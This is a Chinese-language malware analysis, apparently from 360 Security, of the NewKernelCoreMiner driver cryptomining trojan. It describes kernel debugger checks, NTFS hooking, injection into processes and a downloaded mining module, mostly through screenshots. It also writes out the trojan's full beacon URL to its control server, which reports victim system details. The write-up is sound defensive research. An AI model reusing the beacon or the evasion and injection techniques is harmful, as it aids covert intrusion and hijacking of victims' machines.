> 原文链接: https://www.anquanke.com//post/id/150910 


# NewKernelCoreMiner 撑起百万收入的挖矿木马


                                阅读量   
                                **118454**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p0.ssl.qhimg.com/t018899e32953737892.jpg)](https://p0.ssl.qhimg.com/t018899e32953737892.jpg)



## 一、木马概述

近日，360安全中心接到网民反馈，称在使用任务管理器查看电脑资源占用时候发现lsass.exe进程占用CPU异常高，而且居高不下。360在提取用户上传的样本文件后发现，这是一类新的驱动挖矿木马，并将其命名为NewKernelCoreMiner。据监测发现，该木马已经感染超过十万设备，保守估计收益超百万。目前，360安全卫士已经率先支持查杀该木马。



## 二、木马分析

### 1、驱动部分

驱动文件信息为[![](https://p4.ssl.qhimg.com/t01072ff8528afed96f.png)](https://p4.ssl.qhimg.com/t01072ff8528afed96f.png)

驱动主要功能如下图[![](https://p5.ssl.qhimg.com/t01f8a4ce9e0f351368.png)](https://p5.ssl.qhimg.com/t01f8a4ce9e0f351368.png)

然后我们从图中几部分对驱动进行详细分析。

入口点[![](https://p1.ssl.qhimg.com/t0134d8f9108f0890d4.png)](https://p1.ssl.qhimg.com/t0134d8f9108f0890d4.png)

全局变量中保存操作系统和驱动信息[![](https://p3.ssl.qhimg.com/t015307c5a8be7e9e5f.png)](https://p3.ssl.qhimg.com/t015307c5a8be7e9e5f.png)

检测内核调试器[![](https://p0.ssl.qhimg.com/t018af9457878f614d2.png)](https://p0.ssl.qhimg.com/t018af9457878f614d2.png)

保存必要驱动信息，为以后随机化线程地址做准备[![](https://p2.ssl.qhimg.com/t017d0db5675076ff87.png)](https://p2.ssl.qhimg.com/t017d0db5675076ff87.png)

然后初始化下注入挖矿模块信息，该链表是可以随时由应用层更新传给驱动的。主要包含信息为要注入进程名字的Hash，注入模块大小，注入模块代码[![](https://p4.ssl.qhimg.com/t01d872052fa6274955.png)](https://p4.ssl.qhimg.com/t01d872052fa6274955.png)

这个链表可以由应用层随时更新的，然后挂钩NTFS 派遣函数

[![](https://p3.ssl.qhimg.com/t0139138a1265a34bc7.png)](https://p3.ssl.qhimg.com/t0139138a1265a34bc7.png)

最后注册进程回调[![](https://p2.ssl.qhimg.com/t0111fb04c76c5992c2.png)](https://p2.ssl.qhimg.com/t0111fb04c76c5992c2.png)

进程回调中判断进程 注入代码并且传递设备句柄用于交互，之前的设备名完全是随机的[![](https://p2.ssl.qhimg.com/t01a10c0d95cdc5f635.png)](https://p2.ssl.qhimg.com/t01a10c0d95cdc5f635.png)

填充各类有效信息到应用层全局变量[![](https://p2.ssl.qhimg.com/t01c0df5455c15e3923.png)](https://p2.ssl.qhimg.com/t01c0df5455c15e3923.png)

### 2、应用层挖矿模块

驱动传来的信息存在全局变量中，继续填充该全局变量[![](https://p3.ssl.qhimg.com/t01e6b6c505de513ba4.png)](https://p3.ssl.qhimg.com/t01e6b6c505de513ba4.png)

再次判断下注入进程名字信息，该模块为通用判断。如果是浏览器进程则挂钩LdrLoadDll[![](https://p2.ssl.qhimg.com/t01f01e67c350234a27.png)](https://p2.ssl.qhimg.com/t01f01e67c350234a27.png)

禁止以下模块加载[![](https://p1.ssl.qhimg.com/t01338e282857b84811.png)](https://p1.ssl.qhimg.com/t01338e282857b84811.png)

也清理下之前的老版本文件，清理的列表文件[![](https://p4.ssl.qhimg.com/t017a1e13287f061c42.png)](https://p4.ssl.qhimg.com/t017a1e13287f061c42.png)

然后创建两个线程

**线程1主要为打点收集用户信息**

上传信息为[![](https://p5.ssl.qhimg.com/t01a17e4ac6deafe62f.png)](https://p5.ssl.qhimg.com/t01a17e4ac6deafe62f.png)

拼接后:

tj.16610.com/api/_mcc_statu.php?STATUS=0&amp;DHS=00000000&amp;UHS=00000000&amp;RHS=00000000&amp;REV=0&amp;RC=0&amp;CID=9098&amp;UID=9098&amp;VER=20180423&amp;RM=NotAvailable&amp;DMJ=0&amp;DMN=0&amp;DBL=0&amp;UMJ=2&amp;UMN=9&amp;UBL=2976&amp;MID=&amp;BW=32&amp;NTMJ=5&amp;NTMN=1&amp;NTBL=2600&amp;NTSPMJ=3&amp;NTSPMN=0&amp;NP=4&amp;MM=2146869248&amp;OSTC=1396281&amp;SVSN=84C5D18C&amp;SVFS=NTFS

**线程2为加载挖矿模块线程**

真正的挖矿功能模块也是动态下载而来，下载地址为[![](https://p4.ssl.qhimg.com/t01ff6e5a03e91278e8.png)](https://p4.ssl.qhimg.com/t01ff6e5a03e91278e8.png)

矿池配置信息[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01da6c3e5d438272af.png)

随机挑选地址格式化参数[![](https://p3.ssl.qhimg.com/t01d74188fe161b2f4f.png)](https://p3.ssl.qhimg.com/t01d74188fe161b2f4f.png)

配置文件信息[![](https://p3.ssl.qhimg.com/t0119a4217311de2b50.jpg)](https://p3.ssl.qhimg.com/t0119a4217311de2b50.jpg)

使用完成后开启线程删除配置文件[![](https://p5.ssl.qhimg.com/t01977e5f15ffa7346a.png)](https://p5.ssl.qhimg.com/t01977e5f15ffa7346a.png)

然后传入配置信息进行挖矿。注入后线程数量[![](https://p1.ssl.qhimg.com/t0135a66a7b49ffe881.png)](https://p1.ssl.qhimg.com/t0135a66a7b49ffe881.png)

进程CPU占用[![](https://p1.ssl.qhimg.com/t01533df0e30f6e72d9.png)](https://p1.ssl.qhimg.com/t01533df0e30f6e72d9.png)

360安全卫士已经支持查杀[![](https://p4.ssl.qhimg.com/t01ac8a7dace198fce2.jpg)](https://p4.ssl.qhimg.com/t01ac8a7dace198fce2.jpg)



## 三、安全提醒

近期挖矿木马非常活跃，让人防不胜防。建议用户及时打上系统补丁，发现电脑卡慢CPU占用过高等异常情况时候使用安全软件扫描，同时注意保证安全软件的常开以进行防御一旦受诱导而不慎中招，尽快使用360安全卫士查杀清除木马。

此外，360安全卫士已经推出了挖矿木马防护功能，全面防御从各种渠道入侵的挖矿木马。用户开启了该功能后，360安全卫士将会实时拦截各类挖矿木马的攻击，为用户计算机安全保驾护航。

下载地址:[http://down.360safe.com/inst.exe](http://down.360safe.com/inst.exe)
